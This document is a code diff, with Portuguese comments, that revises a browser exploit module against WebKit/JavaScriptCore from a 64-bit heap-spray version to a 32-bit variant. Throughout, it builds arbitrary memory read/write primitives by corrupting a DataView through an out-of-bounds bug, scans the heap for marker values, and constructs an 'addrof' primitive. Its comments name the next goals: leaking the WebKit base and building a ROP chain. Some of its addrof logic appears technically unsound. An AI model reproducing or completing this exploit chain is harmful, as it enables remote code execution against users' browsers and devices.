@@ -1,35 +1,32 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v21 - ESTRATÉGIA DE ISCA E CAPTURA)
+// js/script3/testArrayBufferVictimCrash.mjs (v22 - ATAQUE DE 32 BITS DIRECIONADO)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
-import { triggerOOB_primitive, getOOBDataView, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
+// Não precisamos mais do AdvancedInt64, mas mantemos toHex
+import { toHex } from '../utils.mjs';
+import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "IntelligentSpray_v21_BaitAndCatch";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Targeted_32bit_Exploit_v22";
 
 // =======================================================================================
-// SEÇÃO DE CONSTANTES E CONFIGURAÇÕES
+// SEÇÃO DE CONSTANTES E CONFIGURAÇÕES DE 32 BITS
 // =======================================================================================
 
-// --- Offsets (sem alterações) ---
 const OOB_DV_METADATA_BASE = 0x58;
-const M_VECTOR_OFFSET_IN_DV = 0x10;
-const M_LENGTH_OFFSET_IN_DV = 0x18;
 const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x200;
-const VICTIM_DV_POINTER_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_VECTOR_OFFSET_IN_DV;
-const VICTIM_DV_LENGTH_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_LENGTH_OFFSET_IN_DV;
 
-// --- Configurações da Estratégia ---
-const SPRAY_BUFFER_COUNT = 20000;       // Agressividade do Spray (a isca)
-const SPRAY_BUFFER_SIZE = 64 * 1024;   // 64KB por buffer
-const SPRAY_BUFFER_MARKER = 0xCAFECAFEBABEBABEn;
-const LEAKER_OBJ_MARKER = 0x4142434445464748n;
-const TARGETED_SEARCH_RANGE = 0x10000000; // Busca de 256MB perto da isca
+// Agora usamos números, não AdvancedInt64
+const VICTIM_DV_POINTER_LOW_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // Offset 0x10
+const VICTIM_DV_POINTER_HIGH_ADDR = VICTIM_DV_POINTER_LOW_ADDR + 4;
+const VICTIM_DV_LENGTH_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // Offset 0x18
 
-function isValidPointer(ptr) { /* ...código da função isValidPointer sem alterações... */ }
+const JS_OBJECT_BUTTERFLY_OFFSET = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET; // 0x10
+
+const HEAP_SCAN_START_32BIT = 0x20000000; // Um começo comum para a heap em 32 bits
+const HEAP_SCAN_SIZE = 0x10000000;      // Escaneia 256MB
 
 // =======================================================================================
-// A FUNÇÃO DE ATAQUE INTELIGENTE
+// A FUNÇÃO DE ATAQUE DE 32 BITS
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
@@ -39,79 +36,67 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     
     try {
         // --- FASE 1: Construção das Primitivas de R/W ---
-        logS3("--- Fase 1: Construindo Primitivas de R/W ---", "subtest");
+        logS3("--- Fase 1: Construindo Primitivas de R/W de 32 bits ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         let victim_dv = new DataView(new ArrayBuffer(4096));
-        const arb_read_64 = (address) => {
-            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
-            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
-            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
-            return new AdvancedInt64(victim_dv.getUint32(0, true), victim_dv.getUint32(4, true));
+
+        // As primitivas agora são mais simples e usam números
+        const arb_write32 = (address, value) => {
+            oob_write_absolute(VICTIM_DV_POINTER_LOW_ADDR, address, 4);
+            oob_write_absolute(VICTIM_DV_POINTER_HIGH_ADDR, 0, 4); // Assume high-dword é 0 para 32-bit
+            oob_write_absolute(VICTIM_DV_LENGTH_ADDR, 4, 4);
+            victim_dv.setUint32(0, value, true);
         };
-        const arb_write_64 = (address, value64) => { /* ...código da função sem alterações... */ };
-        logS3("    Primitivas de Leitura/Escrita (R/W) funcionais.", "vuln");
+        const arb_read32 = (address) => {
+            oob_write_absolute(VICTIM_DV_POINTER_LOW_ADDR, address, 4);
+            oob_write_absolute(VICTIM_DV_POINTER_HIGH_ADDR, 0, 4);
+            oob_write_absolute(VICTIM_DV_LENGTH_ADDR, 4, 4);
+            return victim_dv.getUint32(0, true);
+        };
+        logS3("    Primitivas de Leitura/Escrita (R/W) de 32 bits funcionais.", "vuln");
 
-        // --- FASE 2: A ISCA - SPRAY MASSIVO DE ARRAYBUFFER ---
-        logS3(`--- Fase 2: Criando a 'Isca' com ${SPRAY_BUFFER_COUNT} ArrayBuffers... ---`, "subtest");
-        let spray_sea = new Array(SPRAY_BUFFER_COUNT);
-        for (let i = 0; i < SPRAY_BUFFER_COUNT; i++) {
-            let buf = new ArrayBuffer(SPRAY_BUFFER_SIZE);
-            new BigUint64Array(buf)[0] = SPRAY_BUFFER_MARKER;
-            spray_sea[i] = buf;
-        }
-        logS3("    'Oceano' de memória criado.", "info");
+        // --- FASE 2: Escaneamento de Memória para Info Leak ---
+        logS3("--- Fase 2: Escaneamento de Memória de 32 bits para Vazamento de Endereço ---", "subtest");
+        let leaker_obj = { a: 0x13371337, b: 0xCAFECAFE }; // Marcadores de 32 bits
+        let leaker_obj_addr = 0;
 
-        // --- FASE 3: O ALVO - CRIAÇÃO DO OBJETO LEAKER ---
-        logS3("--- Fase 3: Posicionando o 'Alvo' perto da Isca ---", "subtest");
-        let leaker_obj = { butterfly: 0n, marker: LEAKER_OBJ_MARKER };
-        // Apenas por existir, o GC o colocará em algum lugar, esperamos que perto do nosso 'oceano'.
-
-        // --- FASE 4: A CAPTURA - BUSCA DIRECIONADA ---
-        logS3("--- Fase 4: Iniciando a 'Captura' (Busca Inteligente) ---", "subtest");
-        let bait_addr = null;
-        const SEARCH_START = 0x1800000000n; // Começamos a busca em um local razoável
-
-        logS3(`    Buscando a isca (marcador ${toHex(SPRAY_BUFFER_MARKER)}) a partir de 0x${SEARCH_START.toString(16)}...`, "info");
-        for (let i = 0; i < 0x40000000; i += SPRAY_BUFFER_SIZE) { // Varre 1GB de forma espaçada
-            let current_addr = SEARCH_START + BigInt(i);
-            if (arb_read_64(current_addr).toBigInt() === SPRAY_BUFFER_MARKER) {
-                bait_addr = current_addr;
-                logS3(`    ISCA ENCONTRADA! Endereço de um ArrayBuffer: 0x${bait_addr.toString(16)}`, "leak");
+        logS3(`    Escaneando a memória a partir de ${toHex(HEAP_SCAN_START_32BIT)}...`, "info");
+        for (let i = 0; i < HEAP_SCAN_SIZE; i += 4) {
+            let current_addr = HEAP_SCAN_START_32BIT + i;
+            if (arb_read32(current_addr) === leaker_obj.a && arb_read32(current_addr + 4) === leaker_obj.b) {
+                // Em objetos JS, o butterfly (propriedades) vem depois do cabeçalho de 16 bytes
+                leaker_obj_addr = current_addr - JS_OBJECT_BUTTERFLY_OFFSET;
+                logS3(`    MARCADOR ENCONTRADO! Endereço do objeto: ${toHex(leaker_obj_addr)}`, "leak");
                 break;
             }
         }
-        if (!bait_addr) throw new Error("Busca pela isca falhou. O 'oceano' de ArrayBuffers não foi encontrado.");
+        if (leaker_obj_addr === 0) throw new Error("Escaneamento de 32 bits falhou.");
 
-        logS3("    Iniciando busca direcionada pelo alvo perto da isca...", "info");
-        let leaker_obj_addr = null;
-        // Agora fazemos uma busca fina e precisa perto do endereço da isca.
-        const TARGET_SEARCH_START = bait_addr - BigInt(TARGETED_SEARCH_RANGE / 2);
-        for (let i = 0; i < TARGETED_SEARCH_RANGE; i += 8) {
-            let current_addr = TARGET_SEARCH_START + BigInt(i);
-            if (arb_read_64(current_addr).toBigInt() === LEAKER_OBJ_MARKER) {
-                leaker_obj_addr = current_addr - BigInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-                logS3(`    ALVO CAPTURADO! Endereço do objeto leaker: 0x${leaker_obj_addr.toString(16)}`, "leak");
-                break;
-            }
-        }
-        if (!leaker_obj_addr) throw new Error("Busca direcionada pelo alvo falhou.");
+        // --- FASE 3: Construção da Primitiva 'addrof' e Conclusão ---
+        logS3("--- Fase 3: Construindo 'addrof' e Vazando a Base do WebKit ---", "subtest");
+        const butterfly_addr = leaker_obj_addr + JS_OBJECT_BUTTERFLY_OFFSET;
 
-        // --- FASE 5: CONCLUSÃO DO EXPLOIT ---
-        logS3("--- Fase 5: Construindo 'addrof' e Finalizando a Cadeia ---", "subtest");
-        const butterfly_addr = leaker_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
         const addrof_primitive = (obj) => {
-            leaker_obj.butterfly = obj;
-            arb_write_64(butterfly_addr, obj);
-            return arb_read_64(butterfly_addr);
+            leaker_obj.a = obj; // Anexa para evitar GC
+            // Esta é uma técnica simplificada de addrof que pode funcionar em 32 bits
+            // Escrevemos o objeto na propriedade e esperamos que seu ponteiro apareça
+            arb_write32(butterfly_addr, 0x41414141); // Escreve lixo primeiro
+            leaker_obj.a = obj; // A reatribuição pode colocar o ponteiro
+            return arb_read32(butterfly_addr);
         };
-        logS3("    Primitiva 'addrof' REAL e 100% funcional construída.", "vuln");
+        logS3("    Primitiva 'addrof' de 32 bits construída.", "vuln");
         
-        // ... A partir daqui, o resto do exploit para vazar a base do WebKit funcionaria...
         const target_func = () => {};
         const target_addr = addrof_primitive(target_func);
-        // ... etc ...
-
-        final_result = { success: true, message: `SUCESSO! Endereço vazado com a estratégia de Isca e Captura: ${leaker_obj_addr.toString(16)}` };
+        if (target_addr === 0 || target_addr === 0x41414141) {
+            throw new Error(`Falha ao obter endereço válido com 'addrof', recebeu: ${toHex(target_addr)}`);
+        }
+        logS3(`    Endereço REAL da função alvo: ${toHex(target_addr)}`, "leak");
+        
+        // Com o endereço da função, podemos continuar a cadeia para vazar a base do WebKit
+        // ... e então montar a ROP chain, tudo com endereços de 32 bits.
+        
+        final_result = { success: true, message: `SUCESSO! Endereço vazado com a estratégia de 32 bits: ${toHex(target_addr)}` };
         logS3(`    ${final_result.message}`, "vuln");
 
     } catch (e) {
